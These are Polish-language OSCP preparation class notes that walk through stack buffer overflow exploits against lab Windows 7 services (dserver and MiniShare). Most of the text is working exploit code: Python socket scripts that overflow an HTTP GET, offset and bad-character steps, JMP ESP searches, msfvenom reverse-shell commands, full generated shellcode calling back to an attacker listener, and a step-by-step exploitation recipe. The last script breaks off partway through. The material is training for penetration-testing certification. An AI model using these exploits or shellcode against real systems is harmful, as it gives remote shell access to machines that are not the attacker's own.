📅 04.03.2023 🕘 [09:00]


Wykładowca: Paweł Kordos
p.kordos@hackeru.com

Global OSCP Preparation

OSCP Preparation Day 1 
= - = - = - = - = - = 

ℹ️ Przerwy: 

10:30-11:00
13:00-13:45
15:00-15:30

***

🔗 -- Linki do pobrania maszyn
https://ln2.sync.com/dl/4558efc20/4xmz3xcf-3kueqrpw-4mqm2zk5-ez2ttqw5?sync_id=9738370800007

🔗 -- PEN-200: Penetration Testing with Kali Linux
OSCP Certification
https://www.offsec.com/courses/pen-200/

***

### 📋 – Buffer Overflow Exam 1 - dserver
Win7_x32_BoF_E1_dserver_with_flag.ova

1. Maszyna Win 7
2. Kali


NAME  - 20
                      | 
pawel
pawelpawelpawelpawelpa|

===========


pawel                  |IDZ DO ADR|STOS
pawelpawelpawelpawelpaw|elZ DO ADR
pawelpawelpawelpawelpaw|elpawelpaw|elpawelpawelpawel...

----
1 - PRZPELNIC BUFOR
2 - OSADZIC REV SHELLA NA STOSIE
3 - PRZEKIEROWAC DZIALANIE PROGRAMU NA STOS

pawelpawelpawelpawelpaw|IDZ NA STO|REV SHELL


BUFOR.................|EIP.......|ESP..............................

***

netstat -ano

***

expl1.py

import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = ('10.0.2.6',31337)
sock.connect(ip)

#przy http musimy cos zdefiniowac bo inaczej serwer nie bedzie wiedzial co ma zrobic
evil  = "GET"
evil += "AAAAAA"
#musimy poprawnie dla http skonstruowac naglowek 
evil += "HTTP/1.1\r\n\r\n"

sock.send(evil)
sock.close()

Wykonujemy exploit: python2 expl1.py

***

expl2.py

import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = ('10.0.2.6',31337)
sock.connect(ip)

evil  = "GET"
evil += "A" * 500
evil += "HTTP/1.1\r\n\r\n"

sock.send(evil)
sock.close()

***

Immunity Debugger
Podłączamy się do procesu dserver:

 > File > Attach > dserver

    Uruchamiamy aplikację przez Run (ikona Play >)

    python2 expl2.py

    dserver crashuje


Restartujemy aplikację z poziomu Immunity Debugger:

    ikona <<

    ponownie play >


***

Generowanie ciągu znaków:

msf-pattern_create -l 500

expl3.py

import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = ('10.0.2.6',31337)
sock.connect(ip)

evil  = "GET"
evil += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"
evil += "HTTP/1.1\r\n\r\n"

sock.send(evil)
sock.close()

***

python2 expl3.py

EIP 38654137

msf-pattern_offset -l 500 -q 38654137
[*] Exact match at offset 143

***

expl4.py
                      
import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = ('10.0.2.6',31337)
sock.connect(ip)

evil  = "GET"
evil += "A" * 143 + "BBBB" + "C" * 500
evil += "HTTP/1.1\r\n\r\n"

sock.send(evil)
sock.close()

***

python2 expl4.py

EIP 42424242 #czyli BBBB

***

Generowanie badchars w Immunity Debugger pasek statusu (na dole)

!mona bytearray

plik text dostępny pod ścieżką:
    
C:\Users\John\AppData\Local\VirtualStore\Program Files\Immunity Inc\Immunity Debugger

Template badchars:
    
bad = ( "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

***

expl5.py

import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = ('10.0.2.6',31337)
sock.connect(ip)

# UWAGA - Z USUNIETYM x00 BO TO HTTP I HTTP JUZ UZYWA
bad = ( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

evil  = "GET"
evil += "A" * 143 + "BBBB" + bad
evil += "HTTP/1.1\r\n\r\n"

sock.send(evil)
sock.close()

***

python2 expl5.py

ESP > Follow in Dump

usunięte badchary: \x00\x0a

***
Tworzymy reverse shell przy pomocy msfvenom (należy podać znaki, które należy usunąć czyli \x00\x0a), IP - IP naszego kali:

msfvenom -p windows/shell_reverse_tcp LHOST=IP_Kali LPORT=4444 -b "\x00\x0a" -f python
    
Należy skopiować wygenerowny paylod do naszego programu:

expl6.py

import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = ('192.168.31.101',31337)
sock.connect(ip)
buf =  b""
buf += b"\xda\xdb\xbd\x3a\x29\x07\x51\xd9\x74\x24\xf4\x5f"
buf += b"\x31\xc9\xb1\x52\x31\x6f\x17\x03\x6f\x17\x83\xd5"
buf += b"\xd5\xe5\xa4\xd5\xce\x68\x46\x25\x0f\x0d\xce\xc0"
buf += b"\x3e\x0d\xb4\x81\x11\xbd\xbe\xc7\x9d\x36\x92\xf3"
buf += b"\x16\x3a\x3b\xf4\x9f\xf1\x1d\x3b\x1f\xa9\x5e\x5a"
buf += b"\xa3\xb0\xb2\xbc\x9a\x7a\xc7\xbd\xdb\x67\x2a\xef"
buf += b"\xb4\xec\x99\x1f\xb0\xb9\x21\x94\x8a\x2c\x22\x49"
buf += b"\x5a\x4e\x03\xdc\xd0\x09\x83\xdf\x35\x22\x8a\xc7"
buf += b"\x5a\x0f\x44\x7c\xa8\xfb\x57\x54\xe0\x04\xfb\x99"
buf += b"\xcc\xf6\x05\xde\xeb\xe8\x73\x16\x08\x94\x83\xed"
buf += b"\x72\x42\x01\xf5\xd5\x01\xb1\xd1\xe4\xc6\x24\x92"
buf += b"\xeb\xa3\x23\xfc\xef\x32\xe7\x77\x0b\xbe\x06\x57"
buf += b"\x9d\x84\x2c\x73\xc5\x5f\x4c\x22\xa3\x0e\x71\x34"
buf += b"\x0c\xee\xd7\x3f\xa1\xfb\x65\x62\xae\xc8\x47\x9c"
buf += b"\x2e\x47\xdf\xef\x1c\xc8\x4b\x67\x2d\x81\x55\x70"
buf += b"\x52\xb8\x22\xee\xad\x43\x53\x27\x6a\x17\x03\x5f"
buf += b"\x5b\x18\xc8\x9f\x64\xcd\x5f\xcf\xca\xbe\x1f\xbf"
buf += b"\xaa\x6e\xc8\xd5\x24\x50\xe8\xd6\xee\xf9\x83\x2d"
buf += b"\x79\xc6\xfc\x32\x41\xae\xfe\x4c\xa0\x72\x76\xaa"
buf += b"\xa8\x9a\xde\x65\x45\x02\x7b\xfd\xf4\xcb\x51\x78"
buf += b"\x36\x47\x56\x7d\xf9\xa0\x13\x6d\x6e\x41\x6e\xcf"
buf += b"\x39\x5e\x44\x67\xa5\xcd\x03\x77\xa0\xed\x9b\x20"
buf += b"\xe5\xc0\xd5\xa4\x1b\x7a\x4c\xda\xe1\x1a\xb7\x5e"
buf += b"\x3e\xdf\x36\x5f\xb3\x5b\x1d\x4f\x0d\x63\x19\x3b"
buf += b"\xc1\x32\xf7\x95\xa7\xec\xb9\x4f\x7e\x42\x10\x07"
buf += b"\x07\xa8\xa3\x51\x08\xe5\x55\xbd\xb9\x50\x20\xc2"
buf += b"\x76\x35\xa4\xbb\x6a\xa5\x4b\x16\x2f\xd5\x01\x3a"
buf += b"\x06\x7e\xcc\xaf\x1a\xe3\xef\x1a\x58\x1a\x6c\xae"
buf += b"\x21\xd9\x6c\xdb\x24\xa5\x2a\x30\x55\xb6\xde\x36"
buf += b"\xca\xb7\xca"

nop = "\x90" * 16 

#przy http musimy cos zdefiniowac bo inaczej serwer nie bedzie wiedzial co ma zrobic
evil  = "GET"
# dopisuje dodatkowo operacje NOP zeby uniknc problemow z encoderem
evil += "A" * 143 + "BBBB" + nop + buf + nop
#musimy poprawnie dla http skonstrulowac naglowej 
evil += "HTTP/1.1\r\n\r\n"


sock.send(evil)
sock.close()

***

szukamy lokalizacji w kodzie -> \[JMP\] \[ESP\]
\[JMP\] \[ESP\] - polecenie procesorowi pójścia bezwzględnie ( sam ustali sobie lokalizację esp )
!mona find -s "\xff\xe4"

\xff\xe4 to opcode JMP ESP
szukamy lokalizacji w <aplikacja>.exe np "dserver.exe"
musimy wybrać właściwą bibliotekę!
!mona find -s "\xff\xe4" -m dserver.exe

    0x080414c3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [dserver.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\John\Desktop\dserver\dserver.exe)

    0x080416bf : "\xff\xe4" |  {PAGE_EXECUTE_READ} [dserver.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\John\Desktop\dserver\dserver.exe)


przepisujemy od tyłu dwójkami:
    08 04 14 c3
    czyli
    c3 14 04 08
EIP = "\xc3\x14\x04\x08

***

expl7.py

import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = ('192.168.31.101',31337)
sock.connect(ip)
buf =  b""
buf += b"\xda\xdb\xbd\x3a\x29\x07\x51\xd9\x74\x24\xf4\x5f"
buf += b"\x31\xc9\xb1\x52\x31\x6f\x17\x03\x6f\x17\x83\xd5"
buf += b"\xd5\xe5\xa4\xd5\xce\x68\x46\x25\x0f\x0d\xce\xc0"
buf += b"\x3e\x0d\xb4\x81\x11\xbd\xbe\xc7\x9d\x36\x92\xf3"
buf += b"\x16\x3a\x3b\xf4\x9f\xf1\x1d\x3b\x1f\xa9\x5e\x5a"
buf += b"\xa3\xb0\xb2\xbc\x9a\x7a\xc7\xbd\xdb\x67\x2a\xef"
buf += b"\xb4\xec\x99\x1f\xb0\xb9\x21\x94\x8a\x2c\x22\x49"
buf += b"\x5a\x4e\x03\xdc\xd0\x09\x83\xdf\x35\x22\x8a\xc7"
buf += b"\x5a\x0f\x44\x7c\xa8\xfb\x57\x54\xe0\x04\xfb\x99"
buf += b"\xcc\xf6\x05\xde\xeb\xe8\x73\x16\x08\x94\x83\xed"
buf += b"\x72\x42\x01\xf5\xd5\x01\xb1\xd1\xe4\xc6\x24\x92"
buf += b"\xeb\xa3\x23\xfc\xef\x32\xe7\x77\x0b\xbe\x06\x57"
buf += b"\x9d\x84\x2c\x73\xc5\x5f\x4c\x22\xa3\x0e\x71\x34"
buf += b"\x0c\xee\xd7\x3f\xa1\xfb\x65\x62\xae\xc8\x47\x9c"
buf += b"\x2e\x47\xdf\xef\x1c\xc8\x4b\x67\x2d\x81\x55\x70"
buf += b"\x52\xb8\x22\xee\xad\x43\x53\x27\x6a\x17\x03\x5f"
buf += b"\x5b\x18\xc8\x9f\x64\xcd\x5f\xcf\xca\xbe\x1f\xbf"
buf += b"\xaa\x6e\xc8\xd5\x24\x50\xe8\xd6\xee\xf9\x83\x2d"
buf += b"\x79\xc6\xfc\x32\x41\xae\xfe\x4c\xa0\x72\x76\xaa"
buf += b"\xa8\x9a\xde\x65\x45\x02\x7b\xfd\xf4\xcb\x51\x78"
buf += b"\x36\x47\x56\x7d\xf9\xa0\x13\x6d\x6e\x41\x6e\xcf"
buf += b"\x39\x5e\x44\x67\xa5\xcd\x03\x77\xa0\xed\x9b\x20"
buf += b"\xe5\xc0\xd5\xa4\x1b\x7a\x4c\xda\xe1\x1a\xb7\x5e"
buf += b"\x3e\xdf\x36\x5f\xb3\x5b\x1d\x4f\x0d\x63\x19\x3b"
buf += b"\xc1\x32\xf7\x95\xa7\xec\xb9\x4f\x7e\x42\x10\x07"
buf += b"\x07\xa8\xa3\x51\x08\xe5\x55\xbd\xb9\x50\x20\xc2"
buf += b"\x76\x35\xa4\xbb\x6a\xa5\x4b\x16\x2f\xd5\x01\x3a"
buf += b"\x06\x7e\xcc\xaf\x1a\xe3\xef\x1a\x58\x1a\x6c\xae"
buf += b"\x21\xd9\x6c\xdb\x24\xa5\x2a\x30\x55\xb6\xde\x36"
buf += b"\xca\xb7\xca"

nop = "\x90" * 16 

eip = "\xc3\x14\x04\x08"
#przy http musimy cos zdefiniowac bo inaczej serwer nie bedzie wiedzial co ma zrobic
evil  = "GET"
# dopisuje dodatkowo operacje NOP zeby uniknc problemow z encoderem
evil += "A" * 143 + eip + nop + buf + nop
#musimy poprawnie dla http skonstrulowac naglowej 
evil += "HTTP/1.1\r\n\r\n"

sock.send(evil)
sock.close()

#uruchamiamy nasłuchiwanie:
    nc -nvlp 4444
#uruchamiamy program:
    pytchon2 ./exp17.py


Przepis na BoF z sukcesem 


Podsumowanie BoFow - (widok jaki sie uczymy - View -> CPU)
0) Rozpoczecie komunikacji z celem / odpaliene aplikacji / attach + restart + play

1) Odnalezienie kiedy bufor nam sie crashuje (msf-pattern_create -l <dlugosc>
1a) Odczytujemy to co jest w EIP
1b) msf-pattern_offset -l <wczesniej zdefiniowana dlugosc> -q <wartosc z EIP>
1c) Tworzymy PoC na zasadzie payload = "A" * <to kiedy bufor sie przepelnia> + "BBBB" + "C" * 300 -> i czytamy z debuggera czy rejestr EIP jest 42424242
https://www.rapidtables.com/convert/number/ascii-to-hex.html

2) Zidentyfikowanie badcharow w payloadzie
2a) Idziemy do debuggera - na dole "!mona bytearray"
2b) Idziemy na dysku do pliku C:\Users\John\AppData\Local\VirtualStore\Program Files\Immunity Inc\Immunity Debugger
2c) Osadzamy badchary - na stosie czyli zamiast 
"C" * 300 powyzej - wrzucamy badchary
2d) Po wykonaniu klikamy prawym na ESP - Follow in Dump, nastepnie w lewym dolnym rogu - odczytujemy w kolumnie Hex Dump czy dobrze widac (zgadza sie z tym co wyslalismy, nie psuje kolejnych punktow, jest zachowana kolejnosc numerowania). Odrzucamy te znaki ktore cos psuja. Po kazdym odrzuceniu sprawdzamy i wykonujemy ponownie. 
Uwaga - nie zapominamy o \x00

3) W jaki sposob mozna przekierowac dzialanie aplikacji na stos -> Odnalezienie JMP ESP (w pliku lub w dll'kach)
3a) W Immunity Debuggerze - na dole - !mona modules - szukamy gdzie jest ASLR -> false. Najpewniej (ale nie ma gwarancji) bedzie to nasz plik .exe i jakies biblioteki .dll
3b) Na dole - wrzucamy !mona find -s "\xff\xe4" -m <nazwa modulu>
3c) Zapisujemy adres (prawym Copy - address) i sprawdzamy czy sie nie pomylilismy
3d) Debugger - View - CPU, klikamy w toolbarze na czarna strzalke w prawo z 4 kropkami i wklejamy adres odnalezionego powyzej JMP ESP- patrzymy, czy rzeczywiscie jest to FFE4 - JMP ESP
3e) Warto sprawdzic, czy adres JMP ESP nie zawiera BADCHAR. Moze to wplynac na dzialanie exploita. W razie gdyby zawieraly - lepiej poszukac innego. 


4) Wygenegrowanie payloadu
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443 -b "<BADCHARY>" -f python 

5) Tworzymy finalny exploit
5a) Tworzymy zmiennna eip i w zmiennej eip osadzamy znalezione w punkcie $3d - adres w ktorym jest JMP ESP. Uwaga - od konca dwojkami: # JMP ESP 77D34E5B - 77 D3 4E 5B --->>> 5b 4e d3 77 --->>>> eip = "\x5b\x4e\xd3\x77"
5b) tworzymy NOPy dla zaencodowanego payloadu
nop = "\x90" * 16
5c) Osadzamy payload z $4
5d) Tworzymy wlasciwy komunikat do wyslania:
    buffer = "A" * < rozmiar bufora> + eip + nop + buf + nop
    
5e) Sprawdzamy 3 razy - czy 

    - bufor do przepelnenia OK ustawilismy 

    - czy EIP dobrze napisalismy

    - czy payload z $4 nie uciety (z przodu i z tylu)

    - adres IP i port czy dobry

6) Odpalamy listener
7) Tanczymy root dance
8) Zmieniamy IP na druga maszyne - cel - sesja - pobieramy proof.txt

Na celu odpalamy:
    ipconfig
    hostname
    type proof.txt
    
    SCREEEEEEEEEN
    
6) Root Dance <dance>

***

### 📋 Buffer Overflow Exam 2 - Mini2
(Win7_x32_BoF_E2_mini.ova)

#sprawdzamy jakie sa otwarte porty:
    nmap ip_maszyny
    curl ip_maszyny
lub:
    wpisujemy w przeglądarce ip_maszyny


zad2_l.py

import socket,sys,time

size = 100
while(size < 10000):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip = ('192.168.31.209',80)
        sock.connect(ip)
        print "\ntest dla %s" % size
        evil  = "GET"
        evil += "A" * size
        #musimy poprawnie dla http skonstrulowac naglowej 
        evil += "HTTP/1.1\r\n\r\n"
        sock.send(evil)
        sock.close()
        size += 300
        time.sleep(5)

***

msf-pattern_create -l 2000

***

zad2_2.py

import socket,sys,time

size = 100
while(size < 10000):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip = ('192.168.31.209',80)
        sock.connect(ip)
        print "\ntest dla %s" % size
        evil  = "GET"
        evil += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0
Co1Co2Co3Co4Co5Co"
        #musimy poprawnie dla http skonstrulowac naglowej 
        evil += "HTTP/1.1\r\n\r\n"
        sock.send(evil)
        sock.close()
        size += 300
        time.sleep(5)

***

python2 zad2_2.py

EIP 43366843

msf-pattern_offset -l 2000 -q 43366843
[*] Exact match at offset 1788

***

zad2_3.py
import socket,sys,time

size = 100
while(size < 10000):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip = ('192.168.31.209',80)
        sock.connect(ip)
        print "\ntest dla %s" % size
        evil  = "GET"

          evil += "A" * 1788 + "BBBB" + "C" * 500

        #musimy poprawnie dla http skonstrulowac naglowej 
        evil += "HTTP/1.1\r\n\r\n"
        sock.send(evil)
        sock.close()
        size += 300
        time.sleep(5)

***

zad2_4.py

import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = ('192.168.31.209',80)
sock.connect(ip)

bad = ( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf" 
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

#przy http musimy cos zdefiniowac bo inaczej serwer nie bedzie wiedzial co ma zrobic
evil  = "GET"
#evil += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4A>
#evil += "A" * 1788 + "BBBB" + "C" * 500
evil += "A" * 1788 + "BBBB" + bad

#musimy poprawnie dla http skonstrulowac naglowej 
evil += "HTTP/1.1\r\n\r\n"


sock.send(evil)
sock.close()

***
Tworzymy reverse shell przy pomocy msfvenom (należy podać znaki, które należy usunąć czyli \x00\x0a), IP - IP naszego kali:
    
msfvenom -p windows/shell_reverse_tcp LHOST=IP_Kali LPORT=4444 -b "\x00\x0d" -f python
    
Należy skopiować wygenerowny paylod do naszego programu.

!mona find -s "\xff\xe4\" -m minishare.exe

***
zad2_5.py


import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = ('192.168.31.209',80)
